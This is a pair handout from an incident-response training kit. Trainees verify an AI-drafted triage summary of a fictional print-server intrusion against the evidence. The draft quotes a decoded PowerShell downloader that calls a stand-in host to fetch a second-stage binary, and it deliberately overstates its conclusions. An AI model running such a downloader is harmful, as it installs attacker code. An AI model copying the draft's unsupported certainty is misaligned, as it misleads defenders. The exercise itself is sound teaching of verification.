# Verify the draft: an AI-drafted Uncover section for Exercise 1

<!-- ASSURED Methodology by Timothy Zilber, © Block, Inc., CC BY 4.0
     (https://creativecommons.org/licenses/by/4.0/). Reuse and adapt freely
     with attribution; note any changes you make.
     ASSURED facilitator kit, pair handout for Session 3
     (https://assured-methodology.vercel.app/docs/teaching/kit). The key is
     on that page. Hand this out only after pairs have written their own
     Exercise 1 tasks 4-5. -->

**20 minutes, in pairs.** An assistant drafted the Uncover section below for
Exercise 1 (the print server's new scheduled task). Check every claim against
the three raw artifacts in your Exercise 1 packet. For each claim, write one
of: **verified** (name the artifact and field), **not supported** (say what
the artifact actually shows), or **cannot determine yet** (name the query
that would settle it). Then rewrite the conclusion so it says only what the
verified claims support, and fill the Material AI use field at the bottom.

The verification discipline is on the AI-triage page:
https://assured-methodology.vercel.app/docs/ai-triage

All names, addresses and domains are fictional.

## The draft

```
Assistant draft: Uncover summary, case prt-01, generated 04:02 UTC

1. Service account svc-printmgmt authenticated to prt-01 from 10.20.8.114
   (wkst-hr-22) with a network logon (type 3) at 03:22:17 UTC, then opened
   a RemoteInteractive (type 10, RDP) session at 03:24:05 UTC.

2. Per the 90-day baseline, svc-printmgmt has never logged on to prt-01
   interactively or over RDP; its only prior logons there are service
   logons.

3. Before reaching prt-01, svc-printmgmt authenticated from wkst-hr-22 to
   file server fs-02 at 02:57 UTC (logon type 3), consistent with share
   discovery ahead of the move to the print server.

4. At 03:41:02 UTC the account created scheduled task
   \Microsoft\Windows\UpdateHealth, a name chosen to resemble a Windows
   component, running hidden-window encoded PowerShell.

5. The encoded command decodes to:
     $wc=New-Object Net.WebClient;
     $wc.DownloadFile('hxxps://files-cdn-sync[.]example/upd.exe',
                      'C:\ProgramData\upd.exe')
   a downloader retrieving a second-stage binary.

6. At 03:44:51 UTC prt-01 connected to files-cdn-sync.example:443, a
   destination absent from its 90-day proxy baseline. This connection
   retrieved the second-stage payload named in the task.

Conclusion: the share discovery on fs-02, the downloader and the
second-stage retrieval confirm a hands-on intrusion staged from
wkst-hr-22. No benign alternative remains. Recommend likelihood High and
escalation under the escalation tripwire.
```

## Your check

| Claim | Verified / not supported / cannot determine yet | Artifact and field, or the query that settles it |
| --- | --- | --- |
| 1 |  |  |
| 2 |  |  |
| 3 |  |  |
| 4 |  |  |
| 5 |  |  |
| 6 |  |  |
| Conclusion |  |  |

## Rewritten conclusion

<!-- Only what the verified claims support, with a confidence label on each
     claim, and the open checks named. -->

## Material AI use

<!-- Assistant and version (here: "the Session 3 draft"), which sections began
     as AI drafts, and what verification changed. -->

- Material AI use:
